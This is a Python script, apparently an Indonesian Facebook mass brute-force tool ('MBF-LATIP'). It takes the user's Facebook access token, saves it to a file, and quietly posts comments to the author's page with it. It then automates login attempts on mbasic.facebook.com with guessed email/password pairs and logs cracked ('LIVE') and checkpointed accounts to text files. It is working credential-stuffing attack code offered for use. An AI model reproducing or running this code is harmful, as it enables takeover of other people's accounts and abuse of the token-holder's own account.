#!/usr/bin/python
#encoding=utf-8
#Belajarlah Bahasa Pemerograman Dari Pada Copy Paste Dan Recod Script Orang :) TTD : Muhammad Latif Harkat

#Module Upload And Except Install
import json,os,time,sys
from concurrent.futures import ThreadPoolExecutor as Bool
try:
	import pyfiglet
except:
	os.system("python -m pip install pyfiglet")
try:
	import requests as req
except ModuleNotFoundError:
	print("[!] Module Requests Belum Terinstall")
	os.system("pip install requests")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	print("[!] Module Bs4 Belum Terinstall")
	os.system("pip install bs4")
except req.exceptions.ConnectionError:
	print("Koneksi Jaringan Buruk!")
try:
	ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:
	exit("[!] Kesalahan Pada Koneksi")
os.system("clear")
#saved & itung
ok = 0
cp = 0
die = 0
semoa=0
live = []
check = []
##############################

#Run And Scaning Data :v
def kintil():
	a = input("Masukan Pilihan : ")
	if(a=="01" or a=="1"):
		login()
	elif(a=="02" or a=="2"):
		os.system("xdg-open https://latipharkat.blogspot.com/2021/01/cara-mendapatkan-access-token-facebook.html?m=1")
		os.sys.exit()
	else:
		print("Pilihan Tidak Ada!")
		kintil()
def opening():
	os.system("clear")
	print("\t\t     Tools MBF-LATIP v1\nAuthor : Mhmmd Latif | IG : @latipharkat_ | WA : +6283870396203\n\n[01]. Login Access Token Fb\n[02]. Cara Mendapatkan Access Token Fb\n[00]. Keluar\n")
	kintil()
def login():
	t = input("Masukan Access Token Anda : ")
	try:
		to=open("tt.txt","a")
		to.write(t)
		to.close()
		a = json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		r=req.post(f"https://graph.facebook.com/105538331573576/comments/?message=Hallo Bang Latip&access_token={t}")
		r2=req.post(f"https://graph.facebook.com/105538331573576/comments/?message=Jangan Lupa Makan :*&access_token={t}")
		os.system("clear")
		print("Login Berhasil!\nUsername :",a["name"],"\nID Akun :",a["id"],"\n")
		time.sleep(2)
	except KeyError:
		print("[!] Token Salah")
		os.system("rm -rf tt.txt")
		time.sleep(2)
		login()
	except req.exceptions.ConnectionError:
		print("Periksa Koneksi Jaringan Anda!")
		time.sleep(2)
		login()
	
def crackTeman(user,pw,ttl):
	global ok,cp,die
	data={}
	ses=req.Session()
	ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
	a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
	b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
	for c in a("input"):
		try:
			if c.get("name") in b:data.update({c.get("name"):c.get("value")})
			else:continue
		except:pass
	data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
	d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
	if "c_user" in d.cookies:
		ok+=1
		print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}        \x1b[0m",end="")
		print("")
		open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		live.append(user+pw)
	elif "checkpoint" in d.cookies:
		cp+=1
		print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}          \x1b[0m",end="")
		print("")
		open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
		semoa+=1
		chek.append(user+pw)
	else:
		die+=1
	